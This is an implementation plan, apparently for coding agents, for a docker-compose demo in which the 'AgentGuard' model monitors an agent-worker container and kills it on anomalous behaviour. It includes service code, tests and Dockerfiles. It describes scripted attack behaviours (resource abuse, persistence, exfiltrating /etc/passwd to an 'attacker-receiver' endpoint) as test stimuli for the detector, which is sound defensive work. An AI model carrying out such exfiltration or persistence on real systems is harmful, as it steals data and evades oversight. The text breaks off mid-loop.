# AgentGuard Live Demo Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Ship a `docker compose up` demo where a user types a prompt, a real agent-worker container executes a scripted behavior, and the trained `AgentGuard` checkpoint detects anomalies in real time and `docker kill`s the worker on attacks while letting benign prompts run to completion.

**Architecture:** Five-service docker-compose stack on `agentguard-demo-net`. `frontend` (Next.js + shadcn/ui) talks REST + SSE to `control-plane` (FastAPI), which loads `best_model.pt`, orchestrates a per-run `agent-worker` via Docker SDK, pulls OS telemetry windows from `telemetry-collector` (reuses `data/preprocessing.py`), consumes action events emitted by the worker, scores every 5 s on a sliding 30 s window, and kills the worker when score exceeds threshold on 2 consecutive ticks. `attacker-receiver` exists so exfil scripts POST to a real endpoint.

**Tech Stack:** Next.js 15 (App Router) + TypeScript + TailwindCSS + shadcn/ui + Recharts (frontend); Python 3.11 + FastAPI + PyTorch + docker-py + starlette-sse (control-plane); Python 3.11 + FastAPI + stress-ng + curl (agent-worker); Python 3.11 + Flask (attacker-receiver); Python 3.11 + FastAPI, imports `data/preprocessing.py` (telemetry-collector); docker-compose.

**Branch policy:** All commits on `master`. No feature branches.

**Reference plan file:** `C:\Users\wooai\.claude\plans\i-need-to-demo-cached-fountain.md` (has the full design spec and decision rationale — this file focuses on executable tasks).

---

## File structure (new files only; nothing in the main repo is modified)

```
demo/
  docker-compose.yml                          # orchestrates 5 services
  .env.example
  README.md                                   # run instructions
  shared/
    baseline_windows.npy                      # [8, 32] idle baseline, checked in
    norm_stats.json                           # per-feature mean/std from training
    threshold.json                            # scalar threshold (default 0.5)
  control_plane/
    Dockerfile
    pyproject.toml
    app/
      main.py                                 # FastAPI: /health, /run, /runs/{id}/stream
      orchestrator.py                         # docker SDK — create/kill agent-worker
      inference.py                            # model load, forward, threshold logic
      buffers.py                              # Stream1 sliding buf, Stream2 ring buf
      sse.py                                  # per-run async SSE broadcaster
      baseline.py                             # load baseline_windows.npy + norm_stats
      runs.py                                 # Run state machine
      config.py                               # env-var config
    scripts/
      capture_baseline.py                     # one-shot baseline generator
      smoke_forward.py                        # Phase 1 gate: load model + forward
    tests/
      test_inference.py
      test_buffers.py
      test_orchestrator.py
  agent_worker/
    Dockerfile                                # python:3.11-slim + stress-ng + curl
    pyproject.toml
    app/
      main.py                                 # FastAPI: /execute
      router.py                               # keyword → behavior
      events.py                               # action-event emitter (matches Stream2)
      behaviors/
        __init__.py
        benign.py                             # summarize, search, calculate, list_files
        attack.py                             # resource_abuse, exfil, persistence, chain
    fixtures/
      notes.txt
    tests/
      test_router.py
      test_events.py
  telemetry_collector/
    Dockerfile
    pyproject.toml
    app/
      main.py                                 # FastAPI: /window
      proc_sampler.py                         # /proc/* scraper for worker PID
      aggregator.py                           # wraps data/preprocessing.py Stream1 calc
    tests/
      test_proc_sampler.py
      test_aggregator.py
  attacker_receiver/
    Dockerfile
    app.py                                    # Flask :9090 with POST /exfil
  frontend/
    package.json
    next.config.mjs
    tailwind.config.ts
    tsconfig.json
    components.json                           # shadcn config
    app/
      layout.tsx
      page.tsx                                # four-region grid, client component
      globals.css
    components/
      prompt-bar.tsx
      score-chart.tsx
      status-badge.tsx
      telemetry.tsx
      action-log.tsx
      ui/                                     # shadcn-generated primitives
    lib/
      api.ts                                  # postRun + subscribeStream
      types.ts                                # SSE event types
    Dockerfile                                # multi-stage: next build → next start :3000

docs/superpowers/plans/2026-04-23-agentguard-demo.md   # this file
```

**Imports from main repo (never modified):**
- `models/agentguard.py::AgentGuardModel`
- `models/stream1_encoder.py`, `models/stream2_encoder.py`, `models/fusion.py` (transitive)
- `data/preprocessing.py` (Stream 1 aggregation + Stream 2 event encoder)
- `config.yml` (model hyperparameters)
- `data/processed/checkpoints/best_model.pt`

**Import strategy:** Each Docker image `COPY`s the repo root in at `/workspace` and sets `PYTHONPATH=/workspace`. Main repo `pip install` requirements (`torch`, `mamba-ssm` or the torch-only fallback, `numpy`, `pyyaml`, `scikit-learn`) are installed into each Python image that needs to import model code.

---

## Task decomposition

Phase 1 is sequential (main session). Phases 2–5 dispatch to parallel subagents. Phase 6 is sequential acceptance.

---

### Phase 1 — Skeleton + model smoke test (sequential)

#### Task 1.1: Demo directory skeleton + `.gitignore` + README stub

**Files:**
- Create: `demo/README.md`
- Create: `demo/.env.example`
- Create: `demo/docker-compose.yml` (stub, all services as `image: busybox` echoing hello)
- Create: `demo/.gitignore` (ignore `shared/baseline_windows.npy.tmp`, `node_modules`, `.venv`)

- [ ] **Step 1: Create `demo/README.md`**

```markdown
# AgentGuard Live Demo

`docker compose up --build`, then open http://localhost:3000.

Type a prompt or click a chip. Attack prompts (e.g. "stress the cpu", "exfiltrate /etc/passwd") will cause the model to kill the worker. Benign prompts (e.g. "summarize my notes") will complete.
```

- [ ] **Step 2: Create `demo/.env.example`**

```
AGENTGUARD_THRESHOLD=0.5
AGENTGUARD_CHECKPOINT=/workspace/data/processed/checkpoints/best_model.pt
AGENTGUARD_CONFIG=/workspace/config.yml
```

- [ ] **Step 3: Create `demo/docker-compose.yml` stub with all 5 services as busybox echoing hello**

```yaml
services:
  frontend:
    image: busybox
    command: ["sh", "-c", "echo frontend stub && sleep infinity"]
    ports: ["3000:3000"]
  control-plane:
    image: busybox
    command: ["sh", "-c", "echo control-plane stub && sleep infinity"]
    ports: ["8000:8000"]
  agent-worker-template:
    image: busybox
    command: ["sh", "-c", "echo worker stub && sleep infinity"]
  telemetry-collector:
    image: busybox
    command: ["sh", "-c", "echo telemetry stub && sleep infinity"]
  attacker-receiver:
    image: busybox
    command: ["sh", "-c", "echo attacker stub && sleep infinity"]
networks:
  default:
    name: agentguard-demo-net
```

- [ ] **Step 4: Verify stack starts**

Run: `cd demo && docker compose up -d && docker compose ps && docker compose down`
Expected: all 5 services `Up`, then clean `down`.

- [ ] **Step 5: Commit**

```bash
git add demo/
git commit -m "demo: skeleton docker-compose stack"
```

---

#### Task 1.2: Model smoke-test script (proves weights + forward pass work)

**Files:**
- Create: `demo/control_plane/scripts/smoke_forward.py`
- Create: `demo/control_plane/pyproject.toml`
- Create: `demo/control_plane/Dockerfile`

- [ ] **Step 1: Create `demo/control_plane/pyproject.toml`**

```toml
[project]
name = "control-plane"
version = "0.0.1"
requires-python = ">=3.11"
dependencies = [
  "fastapi>=0.110",
  "uvicorn[standard]>=0.29",
  "docker>=7.0",
  "pydantic>=2.6",
  "sse-starlette>=2.1",
  "torch>=2.2",
  "numpy>=1.26",
  "pyyaml>=6.0",
]

[project.optional-dependencies]
test = ["pytest>=8.0", "pytest-asyncio>=0.23", "httpx>=0.27"]
```

- [ ] **Step 2: Create `demo/control_plane/scripts/smoke_forward.py`**

```python
"""Smoke test: load AgentGuard checkpoint, run one forward pass on random tensors.
Exits non-zero on failure. Run inside the control_plane image.
"""
import os
import sys
import yaml
import torch

sys.path.insert(0, "/workspace")
from models.agentguard import AgentGuardModel


def main() -> int:
    cfg_path = os.environ.get("AGENTGUARD_CONFIG", "/workspace/config.yml")
    ckpt_path = os.environ.get(
        "AGENTGUARD_CHECKPOINT",
        "/workspace/data/processed/checkpoints/best_model.pt",
    )

    with open(cfg_path) as f:
        cfg = yaml.safe_load(f)
    m = cfg["model"]

    model = AgentGuardModel(
        stream1_input_dim=m["stream1_input_dim"],
        stream2_input_dim=m["stream2_input_dim"],
        d_model=m["d_model"],
        latent_dim=m["latent_dim"],
        mamba_layers=m["mamba_layers"],
        transformer_layers=m["transformer_layers"],
        transformer_heads=m["transformer_heads"],
        transformer_ff_dim=m["transformer_ff_dim"],
        dropout=m["dropout"],
        max_seq_len=cfg["data"]["max_seq_len"],
        fusion_strategy=m["fusion_strategy"],
        cls_head_layers=m["cls_head_layers"],
        cls_head_hidden_dim=m["cls_head_hidden_dim"],
        cls_head_activation=m["cls_head_activation"],
        decoder_activation=m["decoder_activation"],
    )
    state = torch.load(ckpt_path, map_location="cpu")
    if isinstance(state, dict) and "model_state_dict" in state:
        state = state["model_state_dict"]
    model.load_state_dict(state, strict=False)
    model.eval()

    seq_ctx = cfg["data"]["seq_context"]
    max_len = cfg["data"]["max_seq_len"]
    s1 = torch.randn(1, seq_ctx, m["stream1_input_dim"])
    s2 = torch.randn(1, max_len, m["stream2_input_dim"])
    mask = torch.ones(1, max_len, dtype=torch.bool)

    with torch.no_grad():
        out = model(s1, s2, mask)

    score = out["anomaly_score"].item()
    assert 0.0 <= score <= 1.0, f"score out of range: {score}"
    print(f"smoke OK; anomaly_score={score:.4f}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

- [ ] **Step 3: Create `demo/control_plane/Dockerfile`**

```dockerfile
FROM python:3.11-slim

RUN apt-get update && apt-get install -y --no-install-recommends git && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY demo/control_plane/pyproject.toml .
RUN pip install --no-cache-dir .[test]

COPY . /workspace
ENV PYTHONPATH=/workspace
ENV AGENTGUARD_CONFIG=/workspace/config.yml
ENV AGENTGUARD_CHECKPOINT=/workspace/data/processed/checkpoints/best_model.pt

WORKDIR /app
COPY demo/control_plane/ /app/

CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8000"]
```

- [ ] **Step 4: Build and run smoke test**

Run from repo root:

```bash
docker build -f demo/control_plane/Dockerfile -t agentguard-control-plane:smoke .
docker run --rm agentguard-control-plane:smoke python /app/scripts/smoke_forward.py
```

Expected stdout: `smoke OK; anomaly_score=0.xxxx` and exit 0. If `mamba-ssm` import fails, add the needed build deps to the Dockerfile (see `requirements.txt` in repo root for the canonical versions). If `strict=False` loads missing keys, that's fine for the smoke test; Phase 3 will validate exact parity.

- [ ] **Step 5: Commit**

```bash
git add demo/control_plane/
git commit -m "demo(control-plane): model smoke-test passes inside docker"
```

---

### Phases 2–5 run in parallel (one subagent per phase)

Each phase below is a complete, self-contained work order that a subagent can execute without cross-phase coordination. All four phases write to disjoint file trees.

---

### Phase 2 — Telemetry collector + baseline capture (subagent A)

**Files:**
- Create: `demo/telemetry_collector/Dockerfile`
- Create: `demo/telemetry_collector/pyproject.toml`
- Create: `demo/telemetry_collector/app/{main,proc_sampler,aggregator}.py`
- Create: `demo/telemetry_collector/tests/test_{proc_sampler,aggregator}.py`
- Create: `demo/control_plane/scripts/capture_baseline.py`
- Create: `demo/shared/baseline_windows.npy` (generated artifact)
- Create: `demo/shared/norm_stats.json` (from training data)

#### Task 2.1: `proc_sampler.py` — one-shot /proc reader

- [ ] **Step 1: Test — sampling host returns non-zero CPU under stress**

```python
# demo/telemetry_collector/tests/test_proc_sampler.py
import os, subprocess, time
from app.proc_sampler import sample_once

def test_sample_fields_present():
    s = sample_once(pid=os.getpid())
    assert set(s) >= {"cpu_pct", "mem_pct", "proc_count", "net_conn", "io_read", "io_write"}
    for v in s.values():
        assert isinstance(v, (int, float))
```

- [ ] **Step 2: Run test, expect ImportError** — `pytest demo/telemetry_collector/tests/ -v`

- [ ] **Step 3: Implement `proc_sampler.py`**

```python
# demo/telemetry_collector/app/proc_sampler.py
"""One-shot /proc scraper. Works against either host PID or a PID visible inside the
container (for the worker we use its host PID, passed on startup)."""
from __future__ import annotations
import os
import time
from dataclasses import dataclass, asdict
from pathlib import Path
from typing import Any

@dataclass
class Sample:
    t: float
    cpu_pct: float
    mem_pct: float
    proc_count: int
    net_conn: int
    io_read: float
    io_write: float

_PREV_CPU: dict[int, tuple[float, float]] = {}  # pid -> (proc_total, sys_total)

def _proc_stat_total() -> float:
    parts = Path("/proc/stat").read_text().split("\n", 1)[0].split()[1:]
    return sum(int(x) for x in parts)

def _pid_utime_stime(pid: int) -> float:
    stat = Path(f"/proc/{pid}/stat").read_text()
    fields = stat.rsplit(") ", 1)[1].split()  # skip (comm) which may have spaces
    # utime = fields[11], stime = fields[12] when indexed from field[2] onwards
    utime, stime = int(fields[11]), int(fields[12])
    return float(utime + stime)

def _mem_pct() -> float:
    lines = dict(l.split(":", 1) for l in Path("/proc/meminfo").read_text().splitlines() if ":" in l)
    total = int(lines["MemTotal"].strip().split()[0])
    avail = int(lines["MemAvailable"].strip().split()[0])
    return 100.0 * (1 - avail / total)

def _net_tcp_count() -> int:
    try:
        return max(0, len(Path("/proc/net/tcp").read_text().splitlines()) - 1)
    except FileNotFoundError:
        return 0

def _io_bytes(pid: int) -> tuple[float, float]:
    try:
        io = dict(l.split(": ", 1) for l in Path(f"/proc/{pid}/io").read_text().splitlines())
        return float(io.get("read_bytes", "0")), float(io.get("write_bytes", "0"))
    except (FileNotFoundError, PermissionError):
        return 0.0, 0.0

def sample_once(pid: int) -> dict[str, Any]:
    now = time.time()
    proc_cpu = _pid_utime_stime(pid)
    sys_cpu = _proc_stat_total()
    prev = _PREV_CPU.get(pid)
    _PREV_CPU[pid] = (proc_cpu, sys_cpu)
    if prev is None:
        cpu_pct = 0.0
    else:
        dp, ds = proc_cpu - prev[0], sys_cpu - prev[1]
        cpu_pct = 100.0 * (dp / ds) if ds > 0 else 0.0

    r, w = _io_bytes(pid)
    return asdict(Sample(
        t=now,
        cpu_pct=cpu_pct,
        mem_pct=_mem_pct(),
        proc_count=len(list(Path("/proc").iterdir())),
        net_conn=_net_tcp_count(),
        io_read=r,
        io_write=w,
    ))
```

- [ ] **Step 4: Run test, expect PASS** — `pytest demo/telemetry_collector/tests/test_proc_sampler.py -v`

- [ ] **Step 5: Commit** — `git add demo/telemetry_collector && git commit -m "demo(telemetry): proc sampler"`

#### Task 2.2: `aggregator.py` — reuses `data/preprocessing.py` for Stream 1

- [ ] **Step 1: Test — 30 s of samples aggregates to 32-dim vector**

```python
# demo/telemetry_collector/tests/test_aggregator.py
import time
from app.aggregator import Aggregator

def test_aggregate_shape():
    a = Aggregator(window_size=30.0, seq_context=8)
    t0 = time.time()
    for i in range(60):  # 30 s at 2 Hz
        a.add({"t": t0 + i * 0.5, "cpu_pct": 10.0, "mem_pct": 50.0,
               "proc_count": 100, "net_conn": 5, "io_read": 0.0, "io_write": 0.0})
    w = a.current_window()
    assert w.shape == (8, 32)
```

- [ ] **Step 2: Run, expect ImportError**

- [ ] **Step 3: Implement `aggregator.py`**

```python
# demo/telemetry_collector/app/aggregator.py
"""Thin wrapper over the repo's data/preprocessing.py Stream-1 aggregation.
We reuse the exact column order and statistic set used at training time."""
from __future__ import annotations
import sys
from collections import deque
from typing import Any
import numpy as np

sys.path.insert(0, "/workspace")
# The main repo exposes a function that takes a list of raw samples and returns a
# 32-dim feature vector. If the exact symbol differs, adjust this import to the
# canonical aggregator in data/preprocessing.py (see Task 2.3 validation step).
from data.preprocessing import aggregate_stream1_window  # type: ignore

class Aggregator:
    def __init__(self, window_size: float = 30.0, seq_context: int = 8):
        self.window_size = window_size
        self.seq_context = seq_context
        self._samples: deque[dict[str, Any]] = deque()
        self._windows: deque[np.ndarray] = deque(maxlen=seq_context)

    def add(self, sample: dict[str, Any]) -> None:
        self._samples.append(sample)
        # Trim samples older than seq_context * window_size
        cutoff = sample["t"] - self.seq_context * self.window_size
        while self._samples and self._samples[0]["t"] < cutoff:
            self._samples.popleft()

    def emit_window(self, now: float) -> np.ndarray | None:
        """If a full 30 s window ending at `now` is available, build and return it."""
        start = now - self.window_size
        in_window = [s for s in self._samples if start <= s["t"] <= now]
        if not in_window:
            return None
        vec = aggregate_stream1_window(in_window)   # -> np.ndarray shape (32,)
        self._windows.append(vec)
        return vec

    def current_window(self) -> np.ndarray:
        pad = self.seq_context - len(self._windows)
        stacked = list(self._windows) + [np.zeros(32, dtype=np.float32)] * pad
        return np.stack(stacked, axis=0)
```

- [ ] **Step 4: If `aggregate_stream1_window` does not exist at that exact path/name**, open `data/preprocessing.py`, find the function that takes a list/DataFrame of per-sample telemetry and returns a 32-feature vector for a window, and update the import accordingly. Add a short module-level comment naming the canonical function so future readers don't have to search.

- [ ] **Step 5: Run test, expect PASS**

- [ ] **Step 6: Commit** — `git commit -am "demo(telemetry): 8-window sliding aggregator reuses preprocessing.py"`

#### Task 2.3: FastAPI service exposing `GET /window`

- [ ] **Step 1: Implement `main.py`**

```python
# demo/telemetry_collector/app/main.py
"""Samples /proc for a target container's PID at 2 Hz, emits a 30 s window every 5 s,
exposes /window returning the current [8, 32] sliding tensor."""
from __future__ import annotations
import asyncio
import os
import time
import numpy as np
from fastapi import FastAPI
from .proc_sampler import sample_once
from .aggregator import Aggregator

app = FastAPI()
_agg = Aggregator(window_size=30.0, seq_context=8)
_target_pid: int | None = None

@app.on_event("startup")
async def _boot():
    async def loop():
        while True:
            pid = _target_pid
            if pid is not None:
                try:
                    _agg.add(sample_once(pid))
                except Exception:
                    pass
            await asyncio.sleep(0.5)
    asyncio.create_task(loop())

    async def emit_loop():
        while True:
            _agg.emit_window(time.time())
            await asyncio.sleep(5.0)
    asyncio.create_task(emit_loop())

@app.post("/target/{pid}")
async def set_target(pid: int):
    global _target_pid
    _target_pid = pid
    return {"ok": True, "pid": pid}

@app.get("/window")
async def get_window():
    w = _agg.current_window()
    return {"shape": list(w.shape), "data": w.tolist()}

@app.get("/health")
async def health():
    return {"ok": True}
```

- [ ] **Step 2: Dockerfile**

```dockerfile
# demo/telemetry_collector/Dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY demo/telemetry_collector/pyproject.toml .
RUN pip install --no-cache-dir fastapi uvicorn[standard] numpy
COPY . /workspace
ENV PYTHONPATH=/workspace
COPY demo/telemetry_collector/ /app/
CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8100"]
```

- [ ] **Step 3: Manual verify** — `docker compose up telemetry-collector` once it's wired into compose; `curl localhost:8100/health` → `{"ok": true}`.

- [ ] **Step 4: Commit**

#### Task 2.4: `capture_baseline.py` + generated artifacts

- [ ] **Step 1: Write `demo/control_plane/scripts/capture_baseline.py`** that launches an idle `agent-worker` container, points `telemetry-collector` at it, sleeps 4 minutes, pulls `/window`, and writes `demo/shared/baseline_windows.npy`.

```python
"""One-shot: boot an idle agent-worker, gather 8 consecutive 30 s idle windows,
save to demo/shared/baseline_windows.npy."""
import time, json, httpx, docker, numpy as np, os

def main():
    client = docker.from_env()
    worker = client.containers.run(
        "agentguard-agent-worker:latest",
        name="agent-worker-baseline",
        network="agentguard-demo-net",
        detach=True, remove=True,
    )
    try:
        worker.reload()
        pid = worker.attrs["State"]["Pid"]
        httpx.post("http://telemetry-collector:8100/target/" + str(pid)).raise_for_status()
        # seq_context=8 * window_size=30 = 240 s. Add 10 s slack.
        time.sleep(250)
        r = httpx.get("http://telemetry-collector:8100/window", timeout=10).json()
        arr = np.array(r["data"], dtype=np.float32)
        assert arr.shape == (8, 32), arr.shape
        out = "/workspace/demo/shared/baseline_windows.npy"
        np.save(out, arr)
        print(f"wrote {out} shape={arr.shape}")
    finally:
        try:
            worker.kill()
        except Exception:
            pass

if __name__ == "__main__":
    main()
```

- [ ] **Step 2: Generate `demo/shared/norm_stats.json`** by loading the training data per-feature mean/std (check `training/trainer.py` or a preprocess cache for the canonical values; if not persisted, add a small `scripts/export_norm_stats.py` that reads from the processed data). Final format:

```json
{"mean": [0.0, ..., 0.0], "std": [1.0, ..., 1.0]}
```

(32 floats each.)

- [ ] **Step 3: Run capture, commit artifacts**

```bash
docker compose up -d agent-worker-template telemetry-collector
python demo/control_plane/scripts/capture_baseline.py
git add demo/shared/baseline_windows.npy demo/shared/norm_stats.json
git commit -m "demo(shared): baseline windows + training norm stats"
```

---

### Phase 3 — Control plane (subagent B)

**Files:**
- Create: `demo/control_plane/app/{main,orchestrator,inference,buffers,sse,baseline,runs,config}.py`
- Create: `demo/control_plane/tests/test_{inference,buffers,orchestrator}.py`

#### Task 3.1: `config.py` + `baseline.py`

- [ ] **Step 1: Implement `config.py`**

```python
# demo/control_plane/app/config.py
from dataclasses import dataclass
import os

@dataclass(frozen=True)
class Config:
    checkpoint_path: str = os.environ.get("AGENTGUARD_CHECKPOINT", "/workspace/data/processed/checkpoints/best_model.pt")
    config_yaml:     str = os.environ.get("AGENTGUARD_CONFIG", "/workspace/config.yml")
    threshold:       float = float(os.environ.get("AGENTGUARD_THRESHOLD", "0.5"))
    baseline_npy:    str = os.environ.get("AGENTGUARD_BASELINE", "/app/shared/baseline_windows.npy")
    norm_stats:      str = os.environ.get("AGENTGUARD_NORM", "/app/shared/norm_stats.json")
    worker_image:    str = os.environ.get("AGENTGUARD_WORKER_IMAGE", "agentguard-agent-worker:latest")
    network_name:    str = os.environ.get("AGENTGUARD_NETWORK", "agentguard-demo-net")
    telemetry_url:   str = os.environ.get("AGENTGUARD_TELEMETRY", "http://telemetry-collector:8100")
    tick_sec:        float = 5.0
```

- [ ] **Step 2: Implement `baseline.py`**

```python
# demo/control_plane/app/baseline.py
import json, numpy as np
from .config import Config

def load_baseline(cfg: Config) -> np.ndarray:
    return np.load(cfg.baseline_npy).astype(np.float32)   # (8, 32)

def load_norm(cfg: Config) -> tuple[np.ndarray, np.ndarray]:
    with open(cfg.norm_stats) as f:
        d = json.load(f)
    return np.array(d["mean"], dtype=np.float32), np.array(d["std"], dtype=np.float32) + 1e-6
```

- [ ] **Step 3: Commit**

#### Task 3.2: `buffers.py` — sliding Stream 1 + Stream 2 ring

- [ ] **Step 1: Test**

```python
# demo/control_plane/tests/test_buffers.py
import numpy as np
from app.buffers import Stream1Buffer, Stream2Buffer

def test_s1_preseeded():
    base = np.arange(8*32, dtype=np.float32).reshape(8, 32)
    buf = Stream1Buffer.from_baseline(base)
    assert buf.current().shape == (8, 32)
    new = np.full(32, 99.0, dtype=np.float32)
    buf.push(new)
    assert np.allclose(buf.current()[-1], 99.0)
    assert np.allclose(buf.current()[0], base[1])  # oldest aged out

def test_s2_shape_and_mask():
    buf = Stream2Buffer(max_len=64, dim=28)
    seq, mask = buf.current()
    assert seq.shape == (64, 28) and mask.shape == (64,) and not mask.any()
    buf.push(np.ones(28, dtype=np.float32))
    seq, mask = buf.current()
    assert mask[-1] and not mask[-2]
```

- [ ] **Step 2: Run, expect ImportError**

- [ ] **Step 3: Implement**

```python
# demo/control_plane/app/buffers.py
from __future__ import annotations
from collections import deque
import numpy as np

class Stream1Buffer:
    def __init__(self, seq_context: int = 8, dim: int = 32):
        self._buf: deque[np.ndarray] = deque(maxlen=seq_context)
        self._dim = dim

    @classmethod
    def from_baseline(cls, baseline: np.ndarray) -> "Stream1Buffer":
        assert baseline.shape[1] == 32
        b = cls(baseline.shape[0], baseline.shape[1])
        for row in baseline:
            b._buf.append(row.astype(np.float32))
        return b

    def push(self, vec: np.ndarray) -> None:
        assert vec.shape == (self._dim,)
        self._buf.append(vec.astype(np.float32))

    def current(self) -> np.ndarray:
        return np.stack(list(self._buf), axis=0)

class Stream2Buffer:
    def __init__(self, max_len: int = 64, dim: int = 28):
        self._max = max_len
        self._dim = dim
        self._events: deque[np.ndarray] = deque(maxlen=max_len)

    def push(self, event_vec: np.ndarray) -> None:
        assert event_vec.shape == (self._dim,)
        self._events.append(event_vec.astype(np.float32))

    def current(self) -> tuple[np.ndarray, np.ndarray]:
        n = len(self._events)
        seq = np.zeros((self._max, self._dim), dtype=np.float32)
        mask = np.zeros(self._max, dtype=bool)
        if n:
            seq[self._max - n:] = np.stack(list(self._events), axis=0)
            mask[self._max - n:] = True
        return seq, mask
```

- [ ] **Step 4: Run, expect PASS. Commit.**

#### Task 3.3: `inference.py` — model load + scored forward + threshold

- [ ] **Step 1: Implement**

```python
# demo/control_plane/app/inference.py
from __future__ import annotations
import sys, yaml, torch, numpy as np
sys.path.insert(0, "/workspace")
from models.agentguard import AgentGuardModel
from .config import Config

class Scorer:
    def __init__(self, cfg: Config, mean: np.ndarray, std: np.ndarray):
        self.cfg = cfg
        self.mean = torch.from_numpy(mean)
        self.std = torch.from_numpy(std)
        with open(cfg.config_yaml) as f:
            yml = yaml.safe_load(f)
        m = yml["model"]
        self.model = AgentGuardModel(
            stream1_input_dim=m["stream1_input_dim"],
            stream2_input_dim=m["stream2_input_dim"],
            d_model=m["d_model"], latent_dim=m["latent_dim"],
            mamba_layers=m["mamba_layers"],
            transformer_layers=m["transformer_layers"],
            transformer_heads=m["transformer_heads"],
            transformer_ff_dim=m["transformer_ff_dim"],
            dropout=m["dropout"],
            max_seq_len=yml["data"]["max_seq_len"],
            fusion_strategy=m["fusion_strategy"],
            cls_head_layers=m["cls_head_layers"],
            cls_head_hidden_dim=m["cls_head_hidden_dim"],
            cls_head_activation=m["cls_head_activation"],
            decoder_activation=m["decoder_activation"],
        )
        state = torch.load(cfg.checkpoint_path, map_location="cpu")
        if isinstance(state, dict) and "model_state_dict" in state:
            state = state["model_state_dict"]
        self.model.load_state_dict(state, strict=True)
        self.model.eval()

    def score(self, s1: np.ndarray, s2: np.ndarray, mask: np.ndarray) -> float:
        with torch.no_grad():
            t1 = torch.from_numpy(s1).unsqueeze(0)               # (1, 8, 32)
            t1 = (t1 - self.mean) / self.std
            t2 = torch.from_numpy(s2).unsqueeze(0)               # (1, 64, 28)
            m = torch.from_numpy(mask).unsqueeze(0)              # (1, 64)
            out = self.model(t1, t2, m)
            return float(out["anomaly_score"].item())
```

- [ ] **Step 2: Test** (mark slow)

```python
# demo/control_plane/tests/test_inference.py
import numpy as np, pytest
from app.inference import Scorer
from app.config import Config

@pytest.mark.slow
def test_scorer_runs():
    cfg = Config()
    mean = np.zeros(32, dtype=np.float32); std = np.ones(32, dtype=np.float32)
    s = Scorer(cfg, mean, std)
    score = s.score(
        np.zeros((8, 32), dtype=np.float32),
        np.zeros((64, 28), dtype=np.float32),
        np.zeros(64, dtype=bool),
    )
    assert 0.0 <= score <= 1.0
```

- [ ] **Step 3: Run test inside the control-plane image, commit.**

#### Task 3.4: `orchestrator.py` — docker SDK worker lifecycle

- [ ] **Step 1: Implement**

```python
# demo/control_plane/app/orchestrator.py
import docker
from .config import Config

class WorkerHandle:
    def __init__(self, container, pid: int):
        self.container = container
        self.pid = pid
    def kill(self):
        try: self.container.kill()
        except Exception: pass
        try: self.container.remove(force=True)
        except Exception: pass

class Orchestrator:
    def __init__(self, cfg: Config):
        self.cfg = cfg
        self.client = docker.from_env()

    def start_worker(self, run_id: str) -> WorkerHandle:
        name = f"agent-worker-{run_id}"
        c = self.client.containers.run(
            self.cfg.worker_image, name=name, detach=True, remove=False,
            network=self.cfg.network_name,
            labels={"agentguard.run_id": run_id},
        )
        c.reload()
        return WorkerHandle(c, pid=c.attrs["State"]["Pid"])
```

- [ ] **Step 2: Test**

```python
# demo/control_plane/tests/test_orchestrator.py
import uuid, pytest
from app.orchestrator import Orchestrator
from app.config import Config

@pytest.mark.docker
def test_worker_roundtrip():
    orch = Orchestrator(Config())
    h = orch.start_worker(str(uuid.uuid4())[:8])
    try:
        assert h.pid > 0
    finally:
        h.kill()
```

- [ ] **Step 3: Commit.**

#### Task 3.5: `runs.py` + `sse.py` + `main.py` — endpoint wiring + tick loop

- [ ] **Step 1: Implement `sse.py`** — a per-run `asyncio.Queue[dict]`; `subscribe()` returns an async generator yielding SSE-formatted strings.

```python
# demo/control_plane/app/sse.py
import asyncio, json
from collections import defaultdict

class Broadcaster:
    def __init__(self):
        self._queues: dict[str, list[asyncio.Queue]] = defaultdict(list)

    def subscribe(self, run_id: str) -> asyncio.Queue:
        q: asyncio.Queue = asyncio.Queue()
        self._queues[run_id].append(q)
        return q

    def unsubscribe(self, run_id: str, q: asyncio.Queue) -> None:
        self._queues[run_id].remove(q)

    async def publish(self, run_id: str, event: dict) -> None:
        for q in self._queues.get(run_id, []):
            await q.put(event)

def sse_format(event: dict) -> str:
    return f"data: {json.dumps(event)}\n\n"
```

- [ ] **Step 2: Implement `runs.py`** — a `Run` dataclass + a `RunManager` that owns the orchestrator, scorer, buffers per run, ticks once per `cfg.tick_sec`, issues kill on 2-tick threshold exceedance, and publishes events through the broadcaster. Statuses: `MONITORING` → (`SUSPICIOUS` on 1-tick over threshold) → `KILLED` (on 2nd consecutive) or `COMPLETED` (if worker exits first).

```python
# demo/control_plane/app/runs.py
from __future__ import annotations
import asyncio, time, uuid, httpx, numpy as np
from dataclasses import dataclass, field
from .buffers import Stream1Buffer, Stream2Buffer
from .inference import Scorer
from .orchestrator import Orchestrator, WorkerHandle
from .baseline import load_baseline, load_norm
from .config import Config
from .sse import Broadcaster

@dataclass
class Run:
    run_id: str
    status: str = "MONITORING"
    score: float = 0.0
    over_count: int = 0
    worker: WorkerHandle | None = None
    s1: Stream1Buffer = field(default=None)  # type: ignore
    s2: Stream2Buffer = field(default=None)  # type: ignore

class RunManager:
    def __init__(self, cfg: Config, bc: Broadcaster):
        self.cfg, self.bc = cfg, bc
        self.orch = Orchestrator(cfg)
        mean, std = load_norm(cfg)
        self.scorer = Scorer(cfg, mean, std)
        self.baseline = load_baseline(cfg)
        self.runs: dict[str, Run] = {}

    async def start_run(self, prompt: str) -> str:
        rid = uuid.uuid4().hex[:10]
        handle = self.orch.start_worker(rid)
        async with httpx.AsyncClient() as c:
            await c.post(f"{self.cfg.telemetry_url}/target/{handle.pid}")
        run = Run(
            run_id=rid, worker=handle,
            s1=Stream1Buffer.from_baseline(self.baseline),
            s2=Stream2Buffer(max_len=64, dim=28),
        )
        self.runs[rid] = run
        asyncio.create_task(self._run_loop(run, prompt))
        return rid

    async def _run_loop(self, run: Run, prompt: str):
        # Fire the behavior
        async with httpx.AsyncClient(timeout=None) as c:
            try:
                await c.post(
                    f"http://agent-worker-{run.run_id}:8200/execute",
                    json={"prompt": prompt, "run_id": run.run_id},
                )
            except Exception as e:
                await self.bc.publish(run.run_id, {"type": "log", "line": f"ERR: {e}"})
        # Tick loop
        while run.status == "MONITORING" or run.status == "SUSPICIOUS":
